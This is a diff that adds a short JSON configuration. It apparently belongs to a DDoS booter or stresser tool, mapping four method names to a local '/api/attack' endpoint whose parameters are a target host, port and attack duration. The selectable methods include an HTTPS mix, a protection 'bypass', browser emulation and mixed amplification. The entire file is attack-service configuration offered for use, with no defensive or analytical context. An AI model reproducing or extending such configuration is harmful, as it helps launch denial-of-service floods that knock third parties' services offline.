@@ -1,0 +1,14 @@
+{
+    "HTTPS": {
+        "api": "http://127.0.0.1:5000/api/attack?username=&password=&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=!HTTPS-MIX"
+    },
+    "TLSV2": {
+        "api": "http://127.0.0.1:5000/api/attack?username=&password=&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=!BYPASS"
+    },
+    "HTTP-BROWSER": {
+        "api": "http://127.0.0.1:5000/api/attack?username=&password=&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=!BROWSER"
+    },
+    "MIX-AMP": {
+        "api": "http://127.0.0.1:5000/api/attack?username=&password=&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=!MIXAMP"
+    }
+}
